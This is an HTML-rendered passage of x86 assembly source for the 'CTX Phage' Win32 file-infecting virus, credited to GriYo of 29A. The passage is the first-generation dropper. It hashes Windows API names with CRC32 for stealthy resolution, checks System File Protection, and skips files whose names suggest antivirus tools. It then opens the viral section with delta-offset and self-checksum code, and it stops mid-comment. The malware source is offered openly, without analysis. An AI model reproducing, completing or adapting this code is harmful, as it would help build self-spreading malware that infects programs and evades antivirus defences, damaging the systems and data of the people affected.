<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ctx.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; CTX Phage virus </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; BioCoded by GriYo / 29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; griyo@bi0.net</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc2">.386P</span><span class="sc0">
                </span><span class="sc5">locals</span><span class="sc0">
                </span><span class="sc5">jumps</span><span class="sc0">
                </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32api.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Mz.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Pe.inc</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Fake host used for virus 1st generation</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;We need the CRC lookup table for the next steps</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">host_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_crc_tbl</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Save the CRC32 of 'KERNEL32.DLL' inside virus body</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_szKernel32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_str_crc32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcKernel32</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Save the CRC32 of 'GetProcAddress' inside virus body   </span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_szGetProcAddr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_str_crc32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcGetProcAddr</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get CRC's of needed API's and save them inside virus body</span><span class="sc0">
        </span><span class="sc1">;Lets start with KERNEL32 API names</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumK32Apis</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">namesK32Apis</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CRC32K32Apis</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">save_crc_names</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get API used to check for Windows2000 System File Protection</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumSFCApis</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">namesSFCApis</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CRC32SFCApis</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">save_crc_names</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Build the do-not-infect-file-by-name CRC32 table</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">avoid_num</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">avoid_tbl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">save_crc_names</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get KERNEL32.DLL module handle</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_szKernel32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">out_1st_gen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get1st_end</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">out_1st_gen</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">get1st_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">entry_1st_gen</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Routine that converts API names in CRC32 values</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">save_crc_names</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">get_g1_crc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_str_crc32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_g1_crc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Here comes the rest of the sections in virus 1st generation</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Used to locate KERNEL32 base address on 1st generation</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g1_szKernel32</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_szGetProcAddr</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Do not infect files with this character combinations on its</span><span class="sc0">
                </span><span class="sc1">;name</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g1_avoid_files</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_00</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_01</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_02</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_03</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_04</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_05</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_06</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_07</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_avoid_08</span><span class="sc0">                       

</span><span class="sc5">avoid_num</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">g1_avoid_files</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">g1_avoid_00</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DR'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_01</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_02</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RO'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_03</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VI'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_04</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AV'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_05</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TO'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_06</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_07</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IN'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_avoid_08</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MS'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;KERNEL32.DLL API names</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Note that this tables and strings are not included into the</span><span class="sc0">
        </span><span class="sc1">;virus body after 1st generation. Only CRC32 values</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">namesK32Apis</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_CreateFileA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_CreateFileMappingA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_CloseHandle</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_FindClose</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_FindFirstFileA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_FindNextFileA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_FreeLibrary</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetCurrentDirectoryA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetCurrentProcess</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetFileAttributesA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetLocalTime</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetSystemDirectoryA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetVersionEx</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_GetWindowsDirectoryA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_LoadLibraryA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_MapViewOfFile</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_SetEndOfFile</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_SetFileAttributesA</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_SetFilePointer</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_SetFileTime</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_UnmapViewOfFile</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_VirtualAlloc</span><span class="sc0">
                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_WriteProcessMemory</span><span class="sc0">

</span><span class="sc5">g1_CreateFileA</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_CreateFileMappingA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_CloseHandle</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_FindClose</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_FindFirstFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_FindNextFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_FreeLibrary</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FreeLibrary'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetCurrentDirectoryA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetCurrentProcess</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentProcess'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetFileAttributesA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetLocalTime</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetLocalTime'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetSystemDirectoryA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_LoadLibraryA</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetVersionEx</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetVersionExA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_GetWindowsDirectoryA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_MapViewOfFile</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_SetEndOfFile</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_SetFileAttributesA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_SetFilePointer</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_SetFileTime</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_UnmapViewOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_VirtualAlloc</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VirtualAlloc'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">g1_WriteProcessMemory</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteProcessMemory'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;SFC.DLL API names</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">namesSFCApis</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g1_SfcIsFileProtected</span><span class="sc0">

</span><span class="sc5">g1_SfcIsFileProtected</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SfcIsFileProtected'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'BSS'</span><span class="sc0">

</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Viral section</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">virseg</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'Flu!'</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get delta offset in ebp</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                                
</span><span class="sc5">viro_sys</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">
</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Make the return address point to the instruction which</span><span class="sc0">
        </span><span class="sc1">;made the call</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">cPushad</span><span class="sc4">],</span><span class="sc2">00000005h</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate a CRC32 lookup table</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_crc_tbl</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check CRC32 of main virus body</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; esi -&gt; Ptr to buffer</span><span class="sc0">
        </span><span class="sc1">; ecx -&gt; Buffer size</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfProtect</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CRC_protected</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_crc32</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Checksum matches?</span><span class="sc0">
